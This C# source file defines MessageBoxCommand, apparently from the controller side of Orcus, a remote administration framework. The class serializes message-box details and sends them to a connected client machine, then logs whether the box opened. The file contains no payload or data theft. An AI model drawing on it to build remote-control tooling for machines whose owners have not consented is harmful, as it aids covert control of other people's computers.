using System.Windows;
using Orcus.Administration.Plugins;
using Orcus.Administration.Plugins.CommandViewPlugin;
using Orcus.Shared.Commands.MessageBox;
using Orcus.Shared.Communication;
using Orcus.Shared.NetSerializer;

namespace Orcus.Administration.Commands.MessageBox
{
    public class MessageBoxCommand : Command
    {
        public override void ResponseReceived(byte[] parameter)
        {
            if ((CommandResponse) parameter[0] == CommandResponse.Successful)
            {
                LogService.Receive((string) Application.Current.Resources["MessageBoxOpened"]);
            }
        }

        public void SendMessageBox(MessageBoxInformation messageBoxInformation)
        {
            LogService.Send((string) Application.Current.Resources["OpenMessageBox"]);
            var serializer = new Serializer(typeof (MessageBoxInformation));
            ConnectionInfo.SendCommand(this, serializer.Serialize(messageBoxInformation));
        }

        public override string DescribePackage(byte[] data, bool isReceived)
        {
            return isReceived ? "MessageBoxOpened" : "OpenMessageBox";
        }

        protected override uint GetId()
        {
            return 11;
        }
    }
}